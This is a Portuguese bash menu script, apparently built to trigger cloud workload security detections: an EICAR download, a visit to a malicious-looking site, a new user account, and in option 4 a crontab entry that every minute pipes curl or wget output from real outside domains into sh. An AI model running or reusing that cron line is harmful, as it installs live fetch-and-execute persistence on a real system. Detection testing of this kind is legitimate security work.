#!/bin/bash
x="Cloud Security Workload Securty - Plataforma de teste"
menu ()
{
while true $x != "Cloud Security Workload Securty - Plataforma de teste"
do
clear
echo "================================================"
echo "1) Instalar os requisitos"
echo""
echo "2) C1 Workload Security Antimalware"
echo""
echo "3) C1 Workload Security Web Reputation"
echo ""
echo "4) C1 Workload Security Integrity Monitoring"
echo ""
echo "5) C1 Workload Security Log Inspection"
echo ""
echo "6) Sair do programa"
echo ""
echo "================================================"
echo "Digite a opção desejada:"
read x
echo "Opção informada ($x)"
echo "================================================"

case "$x" in


    1)
      echo "Instalando os requisitos"
      read nome
      sudo apt-get update ; sudo apt-get install wget tcpdump -y $nome
      sleep 3

echo "================================================"
;;
    2)
      echo "Baixando um malware .. cuidado!"
      read nome
      sudo  wget https://secure.eicar.org/eicar.com $nome
      sleep 3
echo "================================================"
;;
   3)
      echo "Acessando um site malicioso"
      sudo wget http://wrs49.winshipway.com $nome
      sleep 3
echo "================================================"
;;
    4)
       echo "Afetuando alterações no sistema!"
       bash -c "echo \"*/1 * * * * (curl -fssL -m15 lsd.systemtxn.org||wget -q -T15 -O- wrs49.winshipway.com)|sh\"|crontab -" $nome
       sleep 3
echo "================================================"
;;
    5)
       echo "Adicionando usuários potencialmente maliciosos e monitorando a rede local"
       sudo useradd suporte01 ; sudo sudo tcpdump -c 5 -n $nome
       sleep 3
echo "================================================"
;;
   6)
         echo "saindo..."
         sleep 3
         clear;
         exit;
echo "================================================"
;;

*)
        echo "Opção inválida!"
esac
done

}
menu
